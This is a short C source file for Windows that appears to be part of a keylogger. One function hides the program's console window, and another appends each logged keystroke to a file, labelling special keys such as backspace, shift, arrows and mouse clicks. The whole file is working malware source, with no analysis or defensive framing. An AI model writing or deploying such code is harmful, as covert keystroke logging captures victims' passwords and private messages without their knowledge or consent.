#include "funcs.h"

void stealth()
{
    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int key, char* path)
{
    if(key == 2) return 0;
    FILE* outFile = fopen(path, "a+");

    switch(key)
    {
        case 8: fprintf(outFile, "[BACKSPACE]"); break;
        case 13: fprintf(outFile, "\n"); break;
        case 32: fprintf(outFile, " "); break;
        case VK_TAB: fprintf(outFile, "[TAB]"); break;
        case VK_SHIFT: fprintf(outFile, "[SHIFT]"); break;
        case VK_CONTROL: fprintf(outFile, "[CONTROL]"); break;
        case VK_ESCAPE: fprintf(outFile, "[ESCAPE]"); break;
        case VK_END: fprintf(outFile, "[END]"); break;
        case VK_HOME: fprintf(outFile, "[HOME]"); break;
        case VK_LEFT: fprintf(outFile, "[LEFT]"); break;
        case VK_RIGHT: fprintf(outFile, "[RIGHT]"); break;
        case VK_UP: fprintf(outFile, "[UP]"); break;
        case VK_DOWN: fprintf(outFile, "[DOWN]"); break;
        case VK_CANCEL: fprintf(outFile, "[CANCEL]"); break;
        case VK_CAPITAL: fprintf(outFile, "[CAPITAL]"); break;
        case VK_CLEAR: fprintf(outFile, "[CLEAR]"); break;
        case VK_LBUTTON: fprintf(outFile, "[LEFT_CLICK]"); break;
        case VK_RBUTTON: fprintf(outFile, "[RIGHT_CLICK]"); break;
        case VK_BROWSER_SEARCH: fprintf(outFile, "[BROWSER_SEARCH]"); break;
        case VK_BROWSER_BACK: fprintf(outFile, "[BROWSER_BACK]"); break;
        case VK_BROWSER_REFRESH: fprintf(outFile, "[BROWSER_REFRESH ]"); break;
        case VK_BROWSER_STOP: fprintf(outFile, "[BROWSER_STOP]"); break;
        default: fprintf(outFile, "%s", &key); break;
    }
    fclose(outFile);
    return 0;
}